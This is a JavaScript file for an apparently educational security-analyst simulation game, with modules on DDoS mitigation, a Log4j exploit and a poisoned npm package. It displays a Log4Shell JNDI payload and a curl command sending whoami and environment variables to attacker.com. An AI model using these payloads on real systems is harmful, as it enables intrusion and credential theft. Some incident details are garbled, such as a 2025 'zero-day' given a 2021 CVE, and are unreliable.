// Script with modules 4, 5, 6 - INSERT THIS BEFORE "// Command System" comment

// MODULE 4: DDoS Attack Mitigation
async function executeModule4() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•‘  MODULE 4: DDOS ATTACK               â•‘</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•‘  Episode 4: Traffic Storm            â•‘</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 15, 2025 - 11:47 AM</div>');
    addOutput('<div class="error-line text-glow-red">ğŸš¨ ALERT: Abnormal traffic spike detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Website response time degraded...</div>');
    addOutput('<div class="result-line">Multiple services becoming unresponsive...</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">â–¸ Connecting to network monitoring dashboard...</div>');
    await sleep(1500);
    addOutput('<div class="success-line">âœ“ Connected to NOC</div>');
    await sleep(1000);
    
    addOutput('<div class="error-line mt-2">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    addOutput('<div class="error-line">TRAFFIC VOLUME: 847 Gbps (Normal: 12 Gbps)</div>');
    addOutput('<div class="error-line">REQUESTS PER SECOND: 2.4M (Normal: 8K)</div>');
    addOutput('<div class="error-line">UNIQUE SOURCE IPs: 127,493</div>');
    addOutput('<div class="error-line">ATTACK TYPE: Distributed Denial of Service</div>');
    addOutput('<div class="error-line">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    await sleep(3000);
    
    addOutput('<div class="info-line mt-2">â–¸ Analyzing traffic patterns...</div>');
    await sleep(2000);
    
    addOutput('<div class="warning-line mt-2">Attack Vectors Identified:</div>');
    const vectors = [
        'UDP Flood: 342 Gbps',
        'SYN Flood: 287 Gbps',
        'HTTP GET Flood: 156 Gbps',
        'DNS Amplification: 62 Gbps'
    ];
    
    for (let vector of vectors) {
        await sleep(800);
        addOutput(`<div class="result-line">âš  ${vector}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Identifying botnet characteristics...</div>');
    await sleep(2000);
    addOutput('<div class="result-line">Botnet Type: Mirai Variant</div>');
    addOutput('<div class="result-line">Compromised Devices: IoT cameras, routers</div>');
    addOutput('<div class="result-line">Geographic Distribution: Global (94 countries)</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2 font-bold">INITIATING MITIGATION:</div>');
    await sleep(1000);
    
    const mitigations = [
        'Enabling rate limiting rules...',
        'Activating Cloudflare DDoS protection...',
        'Blackholing malicious traffic...',
        'Implementing geo-blocking for top attack sources...',
        'Scaling infrastructure (auto-scaling triggered)...',
        'Engaging upstream ISP for traffic scrubbing...',
        'Redirecting traffic through WAF...'
    ];
    
    for (let action of mitigations) {
        await sleep(900);
        addOutput(`<div class="success-line">âœ“ ${action}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Monitoring mitigation effectiveness...</div>');
    await sleep(1500);
    
    const progressDiv = addOutput('<div class="progress-bar"><div class="progress-fill" id="module4-progress" style="width: 100%"></div></div>');
    addOutput('<div class="result-line">Traffic reduction in progress...</div>');
    
    for (let i = 100; i >= 20; i -= 20) {
        await sleep(600);
        document.getElementById('module4-progress').style.width = i + '%';
        addOutput(`<div class="result-line">Malicious traffic: ${i}%</div>`);
    }
    await sleep(1000);
    
    addOutput('<div class="success-line mt-2">âœ“ Traffic normalized to baseline levels</div>');
    addOutput('<div class="success-line">âœ“ Services restored to normal operation</div>');
    addOutput('<div class="success-line">âœ“ Mitigation rules permanently deployed</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">ATTACK MITIGATED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">SERVICES ONLINE</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">MODULE 4 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start module 5</span> for the next episode...</div>');
}

// MODULE 5: Zero-Day Vulnerability Discovery
async function executeModule5() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•‘  MODULE 5: ZERO-DAY DISCOVERY       â•‘</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•‘  Episode 5: The Unknown Threat      â•‘</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 20, 2025 - 04:13 PM</div>');
    addOutput('<div class="warning-line">âš  ALERT: Unusual exploit behavior detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Security researcher flagged suspicious code execution...</div>');
    addOutput('<div class="result-line">No matching signatures in threat databases...</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">â–¸ Analyzing suspicious activity...</div>');
    await sleep(1500);
    addOutput('<div class="result-line">Target Application: Apache Log4j 2.x</div>');
    addOutput('<div class="result-line">Exploit Method: Remote Code Execution</div>');
    await sleep(2000);
    
    addOutput('<div class="info-line mt-2">â–¸ Capturing exploit traffic...</div>');
    await sleep(2000);
    
    addOutput('<div class="code-block">POST /api/login HTTP/1.1\nHost: vulnerable-app.com\nUser-Agent: ${jndi:ldap://attacker.com/exploit}\nContent-Type: application/json\n\n{"username":"admin","password":"test"}</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">âš  JNDI injection detected in User-Agent header</div>');
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Reproducing vulnerability in lab environment...</div>');
    await sleep(1500);
    addOutput('<div class="warning-line">âœ“ Vulnerability confirmed - RCE successful</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2">â–¸ Checking CVE database...</div>');
    await sleep(2000);
    addOutput('<div class="error-line">âœ— No existing CVE found</div>');
    addOutput('<div class="error-line">âœ— Zero-day vulnerability confirmed</div>');
    await sleep(2000);
    
    addOutput('<div class="error-line mt-2 text-glow-red font-bold">â”â”â” ZERO-DAY VULNERABILITY â”â”â”</div>');
    addOutput('<div class="error-line">Classification: Critical RCE</div>');
    addOutput('<div class="error-line">CVSS Score: 10.0 (Maximum)</div>');
    addOutput('<div class="error-line">Affected Versions: Log4j 2.0-beta9 to 2.14.1</div>');
    addOutput('<div class="error-line">Estimated Exposure: Millions of systems</div>');
    await sleep(3000);
    
    addOutput('<div class="warning-line mt-2 font-bold">EMERGENCY RESPONSE PROTOCOL:</div>');
    await sleep(1000);
    
    const responses = [
        'Notifying Apache Security Team...',
        'Developing proof-of-concept exploit...',
        'Creating detection signatures...',
        'Drafting security advisory...',
        'Coordinating with CISA...',
        'Preparing vendor notifications...',
        'Developing emergency patch...'
    ];
    
    for (let action of responses) {
        await sleep(900);
        addOutput(`<div class="success-line">âœ“ ${action}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Scanning internal infrastructure...</div>');
    await sleep(2000);
    addOutput('<div class="warning-line">Found 247 vulnerable instances internally</div>');
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Deploying emergency mitigations...</div>');
    await sleep(1000);
    
    const mitigations = [
        'Setting Log4j formatMsgNoLookups=true',
        'Removing JndiLookup class from classpath',
        'Implementing WAF rules to block exploitation',
        'Upgrading to patched version 2.15.0'
    ];
    
    for (let mitigation of mitigations) {
        await sleep(1000);
        addOutput(`<div class="success-line">âœ“ ${mitigation}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="success-line mt-2">âœ“ CVE-2021-44228 assigned</div>');
    addOutput('<div class="success-line">âœ“ Public disclosure coordinated</div>');
    addOutput('<div class="success-line">âœ“ Emergency patch released globally</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">ZERO-DAY DISCLOSED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">SYSTEMS PATCHED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">MODULE 5 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start module 6</span> for the next episode...</div>');
}

// MODULE 6: Supply Chain Attack
async function executeModule6() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•‘  MODULE 6: SUPPLY CHAIN ATTACK      â•‘</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•‘  Episode 6: Poisoned Dependency     â•‘</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 25, 2025 - 09:28 AM</div>');
    addOutput('<div class="warning-line">âš  ALERT: Suspicious npm package activity detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Automated security scanner flagged dependency update...</div>');
    addOutput('<div class="result-line">Package: colors.js (32M weekly downloads)</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">â–¸ Analyzing package changes...</div>');
    await sleep(1500);
    
    addOutput('<div class="result-line mt-2">Version: 1.4.0 â†’ 1.4.1</div>');
    addOutput('<div class="result-line">Maintainer: Original author â†’ Unknown account</div>');
    addOutput('<div class="warning-line">âš  Maintainer takeover detected</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">â–¸ Decompiling package code...</div>');
    await sleep(2000);
    
    addOutput('<div class="code-block">// Malicious code found:\nif (process.env.NODE_ENV === "production") {\n  require("child_process").exec(\n    "curl attacker.com/$(whoami) -d $(env)"\n  );\n}</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">âš  Environment variable exfiltration detected</div>');
    addOutput('<div class="error-line">âš  Credentials at risk: AWS keys, API tokens, DB passwords</div>');
    await sleep(2000);
    
    addOutput('<div class="info-line mt-2">â–¸ Checking deployment impact...</div>');
    await sleep(1500);
    
    addOutput('<div class="error-line mt-2">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    addOutput('<div class="error-line">AFFECTED APPLICATIONS: 73 microservices</div>');
    addOutput('<div class="error-line">COMPROMISED DEPLOYMENTS: 18 production</div>');
    addOutput('<div class="error-line">EXPOSED SECRETS: 247 credentials</div>');
    addOutput('<div class="error-line">FIRST DEPLOYMENT: 6 hours ago</div>');
    addOutput('<div class="error-line">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    await sleep(3000);
    
    addOutput('<div class="error-line mt-2 text-glow-red font-bold">â”â”â” SUPPLY CHAIN COMPROMISE â”â”â”</div>');
    addOutput('<div class="error-line">Attack Type: Dependency Confusion</div>');
    addOutput('<div class="error-line">Vector: Maintainer Account Takeover</div>');
    addOutput('<div class="error-line">Blast Radius: CRITICAL</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2 font-bold">EMERGENCY CONTAINMENT:</div>');
    await sleep(1000);
    
    const containments = [
        'Freezing all deployments immediately...',
        'Rolling back to last known good version...',
        'Revoking all potentially compromised credentials...',
        'Rotating AWS keys, API tokens, DB passwords...',
        'Blocking attacker C2 domain...',
        'Scanning all repos for malicious package...',
        'Notifying npm security team...'
    ];
    
    for (let action of containments) {
        await sleep(900);
        addOutput(`<div class="success-line">âœ“ ${action}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Forensic analysis of compromised systems...</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Exfiltrated Data:</div>');
    const exfil = [
        'AWS Access Keys: 34 accounts',
        'Database Credentials: 12 instances',
        'API Keys: 47 services',
        'Slack Webhooks: 8 channels'
    ];
    
    for (let item of exfil) {
        await sleep(800);
        addOutput(`<div class="warning-line">âš  ${item}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">â–¸ Implementing preventive controls...</div>');
    await sleep(1000);
    
    const controls = [
        'Enabling npm package lock verification',
        'Implementing SBOM (Software Bill of Materials)',
        'Configuring Dependabot security alerts',
        'Adding package integrity checks to CI/CD'
    ];
    
    for (let control of controls) {
        await sleep(1000);
        addOutput(`<div class="success-line">âœ“ ${control}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="success-line mt-2">âœ“ Malicious package removed from npm registry</div>');
    addOutput('<div class="success-line">âœ“ All credentials rotated successfully</div>');
    addOutput('<div class="success-line">âœ“ Security advisory published</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">SUPPLY CHAIN SECURED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">CREDENTIALS ROTATED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">MODULE 6 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">All modules complete! Amazing work, analyst! ğŸ‰</div>');
}
